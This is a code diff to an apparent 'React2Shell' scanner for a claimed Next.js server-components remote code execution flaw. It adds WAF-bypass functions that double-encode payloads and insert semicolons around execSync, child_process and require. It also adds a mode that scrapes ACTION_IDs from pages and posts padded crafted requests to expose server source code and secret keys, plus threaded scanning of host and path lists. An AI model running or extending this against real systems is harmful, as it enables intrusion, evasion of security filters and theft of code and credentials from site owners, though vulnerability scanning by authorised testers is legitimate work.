@@ -1,4 +1,11 @@
 #!/usr/bin/env python3
+# /// script
+# requires-python = ">=3.9"
+# dependencies = [
+#     "requests>=2.28.0",
+#     "tqdm>=4.64.0",
+# ]
+# ///
 """
 React2Shell Scanner - High Fidelity Detection for RSC/Next.js RCE
 CVE-2025-55182 & CVE-2025-66478
@@ -16,7 +23,7 @@ import string
 from datetime import datetime, timezone
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urlparse
-from typing import Optional
+from typing import Optional, Tuple
 
 try:
     import requests
@@ -57,7 +64,7 @@ def print_banner():
     print(banner)
 
 
-def parse_headers(header_list: list[str] | None) -> dict[str, str]:
+def parse_headers(header_list: Optional[list[str]]) -> dict[str, str]:
     """Parse a list of 'Key: Value' strings into a dict."""
     headers = {}
     if not header_list:
@@ -232,12 +239,45 @@ def resolve_redirects(url: str, timeout: int, verify_ssl: bool, max_redirects: i
     return current_url
 
 
-def send_payload(target_url: str, headers: dict, body: str, timeout: int, verify_ssl: bool) -> tuple[requests.Response | None, str | None]:
-    """Send the exploit payload to a URL. Returns (response, error)."""
+def url_encode_double(text: str) -> str:
+    """Double URL encode a string."""
+    from urllib.parse import quote
+    return quote(quote(text, safe=''), safe='')
+
+
+def add_semicolon_bypass(text: str) -> str:
+    """Add semicolons in strategic places for WAF bypass."""
+    # Add semicolons before common WAF-triggering patterns
+    # This helps bypass some WAFs that parse on semicolons
+    text = text.replace('execSync', ';execSync')
+    text = text.replace('child_process', 'child_process;')
+    text = text.replace('require(', 'require;(')
+    text = text.replace('process.', 'process;.')
+    return text
+
+
+def send_payload(target_url: str, headers: dict, body: str, timeout: int, verify_ssl: bool, double_encode: bool = False, semicolon_bypass: bool = False) -> Tuple[Optional[requests.Response], Optional[str]]:
+    """
+    Send the exploit payload to a URL. Returns (response, error).
+    
+    Args:
+        double_encode: Apply double URL encoding to the body
+        semicolon_bypass: Add semicolons for WAF bypass
+    """
     try:
+        # Apply WAF bypass techniques if requested
+        modified_body = body
+        
+        if semicolon_bypass:
+            modified_body = add_semicolon_bypass(modified_body)
+        
+        if double_encode:
+            # Double encode the body
+            modified_body = url_encode_double(modified_body)
+        
         # Encode body as bytes to ensure proper Content-Length calculation
         # and avoid potential encoding issues with the HTTP client
-        body_bytes = body.encode('utf-8') if isinstance(body, str) else body
+        body_bytes = modified_body.encode('utf-8') if isinstance(modified_body, str) else modified_body
         response = requests.post(
             target_url,
             headers=headers,
@@ -283,7 +323,205 @@ def is_vulnerable_rce_check(response: requests.Response) -> bool:
     return bool(re.search(r'.*/login\?a=11111.*', redirect_header))
 
 
-def check_vulnerability(host: str, timeout: int = 10, verify_ssl: bool = True, follow_redirects: bool = True, custom_headers: dict[str, str] | None = None, safe_check: bool = False, windows: bool = False, waf_bypass: bool = False, waf_bypass_size_kb: int = 128, vercel_waf_bypass: bool = False) -> dict:
+def extract_action_ids(html_content: str) -> list[str]:
+    """Extract ACTION_ID values from HTML content."""
+    action_ids = []
+    # Pattern: ACTION_ID_ followed by alphanumeric hash (typically 40-50 chars)
+    # Can appear in hidden inputs, data attributes, or inline scripts
+    patterns = [
+        r'ACTION_ID_([a-f0-9]{40,50})',  # Standard format: ACTION_ID_<hash>
+        r'["\']?\$?ACTION_ID_([a-f0-9]{40,50})["\']?',  # With quotes or $ prefix
+        r'value=["\']?\$?ACTION_ID_([a-f0-9]{40,50})["\']?',  # In value attribute
+        r'data-action-id=["\']([a-f0-9]{40,50})["\']',  # In data-action-id attribute
+    ]
+    
+    for pattern in patterns:
+        matches = re.findall(pattern, html_content, re.IGNORECASE)
+        action_ids.extend(matches)
+    
+    # Remove duplicates while preserving order
+    seen = set()
+    unique_ids = []
+    for action_id in action_ids:
+        if action_id not in seen:
+            seen.add(action_id)
+            unique_ids.append(action_id)
+    
+    return unique_ids
+
+
+def is_source_code_exposed(response: requests.Response) -> bool:
+    """Check if response contains exposed source code."""
+    if response.status_code != 200:
+        return False
+    
+    response_text = response.text
+    
+    # Indicators of exposed source code:
+    # 1. Function definitions in response
+    # 2. Secret keys or API keys
+    # 3. Database queries
+    # 4. Development mode indicators
+    # 5. Source code comments
+    
+    indicators = [
+        # Function definitions
+        r'async\s+function\s+\w+',
+        r'function\s+\w+\s*\([^)]*\)\s*\{',
+        r'const\s+\w+\s*=\s*(async\s+)?\([^)]*\)\s*=>',
+        # Secrets and keys
+        r'(secret|api[_-]?key|private[_-]?key|access[_-]?token)\s*[:=]\s*["\'][^"\']+["\']',
+        r'INTERNAL[_-]?SECRET',
+        r'SECRET[_-]?KEY',
+        # Database queries
+        r'INSERT\s+INTO\s+\w+',
+        r'SELECT\s+.*\s+FROM\s+\w+',
+        r'UPDATE\s+\w+\s+SET',
+        # Development mode
+        r'"b"\s*:\s*"development"',
+        r'"development"',
+        # Source code comments
+        r'//\s*VULNERABLE',
+        r'/\*\s*VULNERABLE',
+        # Exposed code structure
+        r'inserted["\']?\s*:\s*["\']?.*function',
+        r'inserted["\']?\s*:\s*["\']?.*async',
+    ]
+    
+    for pattern in indicators:
+        if re.search(pattern, response_text, re.IGNORECASE | re.MULTILINE):
+            return True
+    
+    return False
+
+
+def check_action_id_exposure(host: str, timeout: int = 10, verify_ssl: bool = True, custom_headers: Optional[dict[str, str]] = None) -> dict:
+    """
+    Check for source code exposure via ACTION_ID extraction and testing.
+    
+    Returns a dict with:
+        - host: the target host
+        - vulnerable: True/False/None (None if error)
+        - status_code: HTTP status code
+        - error: error message if any
+        - action_ids_found: list of ACTION_IDs found
+        - exposed_code: True if source code was exposed
+    """
+    result = {
+        "host": host,
+        "vulnerable": None,
+        "status_code": None,
+        "error": None,
+        "action_ids_found": [],
+        "exposed_code": False,
+        "tested_url": None,
+        "final_url": None,
+        "timestamp": datetime.now(timezone.utc).isoformat() + "Z"
+    }
+    
+    host = normalize_host(host)
+    if not host:
+        result["error"] = "Invalid or empty host"
+        return result
+    
+    # Step 1: Fetch HTML to find ACTION_IDs
+    try:
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        }
+        
+        if custom_headers:
+            headers.update(custom_headers)
+        
+        response = requests.get(
+            host,
+            headers=headers,
+            timeout=timeout,
+            verify=verify_ssl,
+            allow_redirects=True
+        )
+        
+        result["status_code"] = response.status_code
+        result["tested_url"] = host
+        result["final_url"] = response.url
+        
+        if response.status_code != 200:
+            result["vulnerable"] = False
+            result["error"] = f"Failed to fetch HTML: HTTP {response.status_code}"
+            return result
+        
+        # Step 2: Extract ACTION_IDs from HTML
+        action_ids = extract_action_ids(response.text)
+        result["action_ids_found"] = action_ids
+        
+        if not action_ids:
+            result["vulnerable"] = False
+            return result
+        
+        # Step 3: Test each ACTION_ID for source code exposure
+        for action_id in action_ids:
+            # Build payload with the ACTION_ID
+            # Format based on research: fearsoff=<padding>["$F1"]&1={"id":"<action_id>","bound":null}
+            # Generate some padding to potentially bypass WAFs
+            padding = "_AAAAA_REPEATED_" * 100  # Small padding, can be increased if needed
+            payload_json = json.dumps({"id": action_id, "bound": None})
+            body = f'fearsoff={padding}["$F1"]&1={payload_json}'
+            
+            # Headers for the POST request
+            post_headers = {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0",
+                "Next-Action": action_id,
+                "X-Nextjs-Request-Id": "b5dce965",
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Accept": "text/x-component",
+                "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
+            }
+            
+            if custom_headers:
+                post_headers.update(custom_headers)
+            
+            try:
+                post_response = requests.post(
+                    host,
+                    headers=post_headers,
+                    data=body,
+                    timeout=timeout,
+                    verify=verify_ssl,
+                    allow_redirects=False
+                )
+                
+                # Check if source code is exposed
+                if is_source_code_exposed(post_response):
+                    result["vulnerable"] = True
+                    result["exposed_code"] = True
+                    result["status_code"] = post_response.status_code
+                    # Store response for verbose output
+                    result["response"] = f"HTTP/1.1 {post_response.status_code} {post_response.reason}\r\n"
+                    for k, v in post_response.headers.items():
+                        result["response"] += f"{k}: {v}\r\n"
+                    result["response"] += f"\r\n{post_response.text[:2000]}"
+                    return result
+                    
+            except requests.exceptions.RequestException:
+                continue  # Try next ACTION_ID
+        
+        # No source code exposure found
+        result["vulnerable"] = False
+        return result
+        
+    except requests.exceptions.Timeout:
+        result["error"] = "Request timed out"
+        return result
+    except requests.exceptions.RequestException as e:
+        result["error"] = f"Request failed: {str(e)}"
+        return result
+    except Exception as e:
+        result["error"] = f"Unexpected error: {str(e)}"
+        return result
+
+
+def check_vulnerability(host: str, timeout: int = 10, verify_ssl: bool = True, follow_redirects: bool = True, custom_headers: Optional[dict[str, str]] = None, safe_check: bool = False, windows: bool = False, waf_bypass: bool = False, waf_bypass_size_kb: int = 128, vercel_waf_bypass: bool = False, paths: Optional[list[str]] = None, double_encode: bool = False, semicolon_bypass: bool = False) -> dict:
     """
     Check if a host is vulnerable to CVE-2025-55182/CVE-2025-66478.
 
@@ -305,6 +543,7 @@ def check_vulnerability(host: str, timeout: int = 10, verify_ssl: bool = True, f
         "request": None,
         "response": None,
         "final_url": None,
+        "tested_url": None,
         "timestamp": datetime.now(timezone.utc).isoformat() + "Z"
     }
 
@@ -313,7 +552,11 @@ def check_vulnerability(host: str, timeout: int = 10, verify_ssl: bool = True, f
         result["error"] = "Invalid or empty host"
         return result
 
-    root_url = f"{host}/"
+    # Determine which paths to test
+    if paths:
+        test_paths = paths
+    else:
+        test_paths = ["/"]  # Default to root path
 
     if safe_check:
         body, content_type = build_safe_payload()
@@ -354,47 +597,67 @@ def check_vulnerability(host: str, timeout: int = 10, verify_ssl: bool = True, f
         resp_str += f"\r\n{resp.text[:2000]}"
         return resp_str
 
-    # First, test the root path
-    result["final_url"] = root_url
-    result["request"] = build_request_str(root_url)
+    # Test each path
+    for idx, path in enumerate(test_paths):
+        # Ensure path starts with /
+        if not path.startswith("/"):
+            path = "/" + path
+        
+        test_url = f"{host}{path}"
+        
+        # First, test the path
+        result["tested_url"] = test_url
+        result["final_url"] = test_url
+        result["request"] = build_request_str(test_url)
 
-    response, error = send_payload(root_url, headers, body, timeout, verify_ssl)
+        response, error = send_payload(test_url, headers, body, timeout, verify_ssl, double_encode=double_encode, semicolon_bypass=semicolon_bypass)
 
-    if error:
-        result["error"] = error
-        return result
+        if error:
+            # In RCE mode, timeouts indicate not vulnerable (patched servers hang)
+            if not safe_check and error == "Request timed out":
+                result["vulnerable"] = False
+                result["error"] = error
+                # Continue to next path if there are more, otherwise return
+                if idx < len(test_paths) - 1:
+                    continue
+                return result
+            # For other errors, continue to next path unless it's the last one
+            if idx < len(test_paths) - 1:
+                continue
+            result["error"] = error
+            return result
 
-    result["status_code"] = response.status_code
-    result["response"] = build_response_str(response)
+        result["status_code"] = response.status_code
+        result["response"] = build_response_str(response)
 
-    if is_vulnerable(response):
-        result["vulnerable"] = True
-        return result
+        if is_vulnerable(response):
+            result["vulnerable"] = True
+            return result
 
-    # Root not vulnerable - try redirect path if enabled
-    if follow_redirects:
-        try:
-            redirect_url = resolve_redirects(root_url, timeout, verify_ssl)
-            if redirect_url != root_url:
-                # Different path, test it
-                response, error = send_payload(redirect_url, headers, body, timeout, verify_ssl)
+        # Path not vulnerable - try redirect path if enabled
+        if follow_redirects:
+            try:
+                redirect_url = resolve_redirects(test_url, timeout, verify_ssl)
+                if redirect_url != test_url:
+                    # Different path, test it
+                    response, error = send_payload(redirect_url, headers, body, timeout, verify_ssl, double_encode=double_encode, semicolon_bypass=semicolon_bypass)
 
-                if error:
-                    # Keep root result but note the redirect failed
-                    result["vulnerable"] = False
-                    return result
+                    if error:
+                        # Continue to next path
+                        continue
 
-                result["final_url"] = redirect_url
-                result["request"] = build_request_str(redirect_url)
-                result["status_code"] = response.status_code
-                result["response"] = build_response_str(response)
+                    result["final_url"] = redirect_url
+                    result["request"] = build_request_str(redirect_url)
+                    result["status_code"] = response.status_code
+                    result["response"] = build_response_str(response)
 
-                if is_vulnerable(response):
-                    result["vulnerable"] = True
-                    return result
-        except Exception:
-            pass  # Continue with root result if redirect resolution fails
+                    if is_vulnerable(response):
+                        result["vulnerable"] = True
+                        return result
+            except Exception:
+                pass  # Continue to next path if redirect resolution fails
 
+    # All paths tested, not vulnerable
     result["vulnerable"] = False
     return result
 
@@ -415,6 +678,27 @@ def load_hosts(hosts_file: str) -> list[str]:
         print(colorize(f"[ERROR] Failed to read file: {e}", Colors.RED))
         sys.exit(1)
     return hosts
+
+
+def load_paths(paths_file: str) -> list[str]:
+    """Load paths from a file, one per line."""
+    paths = []
+    try:
+        with open(paths_file, "r") as f:
+            for line in f:
+                path = line.strip()
+                if path and not path.startswith("#"):
+                    # Ensure path starts with /
+                    if not path.startswith("/"):
+                        path = "/" + path
+                    paths.append(path)
+    except FileNotFoundError:
+        print(colorize(f"[ERROR] File not found: {paths_file}", Colors.RED))
+        sys.exit(1)
+    except Exception as e:
+        print(colorize(f"[ERROR] Failed to read file: {e}", Colors.RED))
+        sys.exit(1)
+    return paths
 
 
 def save_results(results: list[dict], output_file: str, vulnerable_only: bool = True):
@@ -438,29 +722,49 @@ def save_results(results: list[dict], output_file: str, vulnerable_only: bool = 
 def print_result(result: dict, verbose: bool = False):
     host = result["host"]
     final_url = result.get("final_url")
-    redirected = final_url and final_url != f"{normalize_host(host)}/"
+    tested_url = result.get("tested_url")
+    # A redirect occurred if final_url differs from the originally tested URL
+    redirected = final_url and tested_url and final_url != tested_url
 
     if result["vulnerable"] is True:
         status = colorize("[VULNERABLE]", Colors.RED + Colors.BOLD)
         print(f"{status} {colorize(host, Colors.WHITE)} - Status: {result['status_code']}")
         if redirected:
             print(f"  -> Redirected to: {final_url}")
+        
+        # Show ACTION_ID findings if available
+        action_ids = result.get("action_ids_found", [])
+        if action_ids:
+            print(colorize(f"  -> Found {len(action_ids)} ACTION_ID(s): {', '.join(action_ids[:3])}", Colors.YELLOW))
+            if len(action_ids) > 3:
+                print(colorize(f"  -> ... and {len(action_ids) - 3} more", Colors.YELLOW))
+        
+        if result.get("exposed_code"):
+            print(colorize("  -> Source code exposed in response!", Colors.RED + Colors.BOLD))
     elif result["vulnerable"] is False:
         status = colorize("[NOT VULNERABLE]", Colors.GREEN)
-        print(f"{status} {host} - Status: {result['status_code']}")
+        if result.get('status_code') is not None:
+            print(f"{status} {host} - Status: {result['status_code']}")
+        else:
+            error_msg = result.get("error", "")
+            print(f"{status} {host}" + (f" - {error_msg}" if error_msg else ""))
         if redirected and verbose:
             print(f"  -> Redirected to: {final_url}")
+        
+        # Show ACTION_ID findings even if not vulnerable
+        action_ids = result.get("action_ids_found", [])
+        if action_ids and verbose:
+            print(colorize(f"  -> Found {len(action_ids)} ACTION_ID(s) but no source code exposure", Colors.CYAN))
     else:
         status = colorize("[ERROR]", Colors.YELLOW)
         error_msg = result.get("error", "Unknown error")
         print(f"{status} {host} - {error_msg}")
 
-    if verbose and result["vulnerable"]:
+    if verbose and result.get("response"):
         print(colorize("  Response snippet:", Colors.CYAN))
-        if result.get("response"):
-            lines = result["response"].split("\r\n")[:10]
-            for line in lines:
-                print(f"    {line}")
+        lines = result["response"].split("\r\n")[:10]
+        for line in lines:
+            print(f"    {line}")
 
 
 def main():
@@ -473,6 +777,10 @@ Examples:
   %(prog)s -l hosts.txt -t 20 -o results.json
   %(prog)s -l hosts.txt --threads 50 --timeout 15
   %(prog)s -u https://example.com -H "Authorization: Bearer token" -H "User-Agent: CustomAgent"
+  %(prog)s -u https://example.com --path /_next
+  %(prog)s -u https://example.com --path /_next --path /api
+  %(prog)s -u https://example.com --path-file paths.txt
+  %(prog)s -u https://example.com --check-source-exposure
         """
     )
 
@@ -529,7 +837,7 @@ Examples:
     parser.add_argument(
         "-v", "--verbose",
         action="store_true",
-        help="Verbose output (show response snippets for vulnerable hosts)"
+        help="Verbose output (show response snippets for all hosts)"
     )
 
     parser.add_argument(
@@ -576,6 +884,36 @@ Examples:
         help="Use Vercel WAF bypass payload variant"
     )
 
+    parser.add_argument(
+        "--path",
+        action="append",
+        dest="paths",
+        help="Custom path to test (e.g., '/_next', '/api'). Can be used multiple times to test multiple paths"
+    )
+
+    parser.add_argument(
+        "--path-file",
+        help="File containing list of paths to test (one per line, e.g., '/_next', '/api')"
+    )
+
+    parser.add_argument(
+        "--check-source-exposure",
+        action="store_true",
+        help="Check for source code exposure via ACTION_ID extraction from HTML"
+    )
+
+    parser.add_argument(
+        "--double-encode",
+        action="store_true",
+        help="Apply double URL encoding to bypass WAFs"
+    )
+
+    parser.add_argument(
+        "--semicolon-bypass",
+        action="store_true",
+        help="Add semicolons in strategic places to bypass WAFs"
+    )
+
     args = parser.parse_args()
 
     if args.no_color or not sys.stdout.isatty():
@@ -601,6 +939,18 @@ Examples:
         print(colorize("[ERROR] No hosts to scan", Colors.RED))
         sys.exit(1)
 
+    # Load paths if specified
+    paths = None
+    if args.path_file:
+        paths = load_paths(args.path_file)
+    elif args.paths:
+        paths = []
+        for path in args.paths:
+            # Ensure path starts with /
+            if not path.startswith("/"):
+                path = "/" + path
+            paths.append(path)
+
     # Adjust timeout for WAF bypass mode
     timeout = args.timeout
     if args.waf_bypass and args.timeout == 10:
@@ -608,6 +958,8 @@ Examples:
 
     if not args.quiet:
         print(colorize(f"[*] Loaded {len(hosts)} host(s) to scan", Colors.CYAN))
+        if paths:
+            print(colorize(f"[*] Testing {len(paths)} path(s): {', '.join(paths)}", Colors.CYAN))
         print(colorize(f"[*] Using {args.threads} thread(s)", Colors.CYAN))
         print(colorize(f"[*] Timeout: {timeout}s", Colors.CYAN))
         if args.safe_check:
@@ -620,6 +972,12 @@ Examples:
             print(colorize(f"[*] WAF bypass enabled ({args.waf_bypass_size}KB junk data)", Colors.CYAN))
         if args.vercel_waf_bypass:
             print(colorize("[*] Vercel WAF bypass mode enabled", Colors.CYAN))
+        if args.double_encode:
+            print(colorize("[*] Double URL encoding bypass enabled", Colors.CYAN))
+        if args.semicolon_bypass:
+            print(colorize("[*] Semicolon bypass enabled", Colors.CYAN))
+        if args.check_source_exposure:
+            print(colorize("[*] Source code exposure check enabled (ACTION_ID extraction)", Colors.CYAN))
         if args.insecure:
             print(colorize("[!] SSL verification disabled", Colors.YELLOW))
         print()
@@ -635,8 +993,28 @@ Examples:
         import urllib3
         urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+    # Determine which check function to use
+    if args.check_source_exposure:
+        check_func = check_action_id_exposure
+        check_kwargs = {"timeout": timeout, "verify_ssl": verify_ssl, "custom_headers": custom_headers}
+    else:
+        check_func = check_vulnerability
+        check_kwargs = {
+            "timeout": timeout,
+            "verify_ssl": verify_ssl,
+            "custom_headers": custom_headers,
+            "safe_check": args.safe_check,
+            "windows": args.windows,
+            "waf_bypass": args.waf_bypass,
+            "waf_bypass_size_kb": args.waf_bypass_size,
+            "vercel_waf_bypass": args.vercel_waf_bypass,
+            "paths": paths,
+            "double_encode": args.double_encode,
+            "semicolon_bypass": args.semicolon_bypass
+        }
+    
     if len(hosts) == 1:
-        result = check_vulnerability(hosts[0], timeout, verify_ssl, custom_headers=custom_headers, safe_check=args.safe_check, windows=args.windows, waf_bypass=args.waf_bypass, waf_bypass_size_kb=args.waf_bypass_size, vercel_waf_bypass=args.vercel_waf_bypass)
+        result = check_func(hosts[0], **check_kwargs)
         results.append(result)
         if not args.quiet or result["vulnerable"]:
             print_result(result, args.verbose)
@@ -645,7 +1023,7 @@ Examples:
     else:
         with ThreadPoolExecutor(max_workers=args.threads) as executor:
             futures = {
-                executor.submit(check_vulnerability, host, timeout, verify_ssl, custom_headers=custom_headers, safe_check=args.safe_check, windows=args.windows, waf_bypass=args.waf_bypass, waf_bypass_size_kb=args.waf_bypass_size, vercel_waf_bypass=args.vercel_waf_bypass): host
+                executor.submit(check_func, host, **check_kwargs): host
                 for host in hosts
             }
 
